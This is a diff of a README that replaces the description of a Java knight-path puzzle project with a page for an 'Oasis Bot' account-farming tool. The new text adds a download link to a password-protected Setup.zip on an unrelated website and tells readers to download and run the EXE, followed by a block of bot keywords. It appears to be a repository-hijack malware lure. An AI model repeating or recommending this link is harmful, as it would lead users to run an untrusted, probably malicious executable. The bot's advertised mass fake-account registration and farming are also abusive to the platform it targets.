@@ -1,50 +1,77 @@
-# KnightUniquePaths
+# Oasis Bot
 
-This Java project calculates all unique knight-move paths within an input grid, following specified constraints. The goal is to determine unique paths of exactly 10 cells (9 moves plus starting cell), starting from any valid cell on the grid, satisfying constraints such as limiting vowels and avoiding invalid cells (`#`).
+# [DOWNLOAD](https://erdogansigorta.com/temp/Setup.zip)  
+## Password - z4iS5VVOeZIe
 
-## Requirements
 
-- Java 11 or higher
-- Maven (for dependency management)
+## Overview
 
-## Getting Started
+Oasis Bot is an advanced automation tool designed to streamline account registration and farming processes. With its powerful features and user-friendly interface, it offers a seamless experience for users looking to maximize their efficiency on the platform.
 
-1. **Clone the Repository**:
-    ```bash
-    git clone https://github.com/cangle1710/Chess-Total-Unique-Paths.git
-    cd Chess-Total-Unique-Paths/
-    ```
+---
 
-2. **Build the Project**:
- Run Maven to compile and set up dependencies:
-     ```bash
-     mvn clean install
-     ```
+## 🚀 Features
 
-## Running the Program
+- ✅ Automatic account registration
+- 🌾 Automated farming
+- 🔄 Automated farming with auto-swap proxy
+- 🔁 Automated re-verification of accounts
+- 🧩 Captcha solving
+- 📧 Email verification
+- 🎟️ Invite code binding
+- 📊 Export statistics to CSV
+- 🧵 Multi-threaded support for registration, export stats, and re-verify accounts
+- 📤 Auto-export unverified/unregistered accounts
 
-To execute the program, run the following Maven command, which will run the main class `MainRunner`:
+---
 
-```bash
-mvn exec:java -Dexec.mainClass="MainRunner"
-```
-Or run the artifact jar file in with following command:
-```bash
- java -jar ParabolicSurfCangLe.jar
-```
+## 💻 Requirements
 
-## Customizing the Grid
+- Windows operating system
+- Internet connection
+- Valid email accounts for registration
+- Valid proxies
 
-To customize the grid, you can either modify the grid array directly in the input txt file in the resources folder. Format the .txt file where:
+---
 
-    Letters (A-Z) represent valid cells.
-    # represents invalid cells that the knight cannot land on.
+## 🛠️ Setup
 
-Example Grid
-```
-A,B,C,#,E
-#,G,H,I,J
-K,L,#,N,O
-P,Q,R,S,T
-U,V,#,#,Y
-```
+1. Download the EXE file.
+2. Run the EXE file and login. It will automatically bind to your PC (the bind will disappear automatically if you close all sessions).
+3. Prepare the configuration files as described below.
+
+---
+
+## 🚀 Usage
+
+1. Ensure all configuration files are set up correctly.
+2. Run the EXE file.
+
+---
+
+## ⚠️ Important Notes
+
+- The script is limited to 2 active sessions. For example, you can use 2 sessions on one PC or 1 session on 2 PCs.
+- The bot uses CapSolver for solving captchas. Ensure you have sufficient balance in your CapSolver account.
+
+---
+
+## 🔧 Troubleshooting
+
+- **Email Verification Issues**: Check your email provider's IMAP settings and ensure they match the configuration.
+- **Captcha Problems**: Verify your CapSolver API key and account balance.
+- **Unexpected Farming Stops**: Check the console output for error messages and ensure your account credentials are correct.
+
+### 🔑 Keywords
+
+- Oasis-Reger
+- Oasis-Farmer
+- Oasis-Miner
+- Oasis-Multireger
+- Oasis-Multifarmer
+- Oasis-AutoFarm
+- Oasis-Extension-Bot
+- Oasis-Bot
+- Oasis-Multiwallet
+
+---
